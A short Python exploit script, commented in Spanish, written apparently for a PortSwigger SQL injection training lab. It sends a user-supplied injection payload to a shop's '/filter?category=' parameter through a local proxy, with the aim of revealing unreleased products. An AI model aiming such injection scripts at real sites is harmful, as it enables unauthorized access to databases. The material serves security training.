# Explicacion del vector de ataque.
'''
    El componente objetivo en el filtro de la categoria de producto.
    Cuando el usuario selecciona una categoria la aplicacion ejecuta
    
    SELECT * FROM products WHERE category = 'Gifts' and released = 1

    Esta sentencia pide a la base de datos reunir todos los prodcutos que son
    regalos (Gifts) y que cumplan con la condicion de encontrarse en lanzamiento publico
    (released = 1)

    El ataque consistira en inyectar dentro de la consulta SQL la solicitud de
    encontrar todos los productos en catalogo, independiente de su condicion "released".
'''

import requests
import sys
import urllib3

from colorama import init, Fore, Back, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def inyeccion(url_objetivo, carga):
    ruta_objetivo = '/filter?category='
    pyl = url_objetivo+ruta_objetivo+carga
    print(Fore.YELLOW, '\n(inyeccion \'{}\')'.format(pyl))
    print(Style.RESET_ALL)


    dosis = requests.get(url_objetivo+ruta_objetivo+carga, verify=False, proxies=proxies)
    
    # print(dosis.text)


# Funcion Principal
def main():

    '''Inicio Colorama'''
    init()


    url_objetivo = sys.argv[1]
    carga = sys.argv[2]

    print("Asagi CWE-89, CAPEC-66 :: Inyeccion SQL (SQLi) - Laboratorio Uno Portswigger\n")
    print("Parametros ingresados")
    print("\t  Sistema objetivo: " + Fore.GREEN + "{}".format(url_objetivo))
    print("\t", Style.RESET_ALL, "Carga:", Fore.RED, "{}".format(carga))

    inyeccion(url_objetivo, carga)


if __name__ == '__main__':
    main()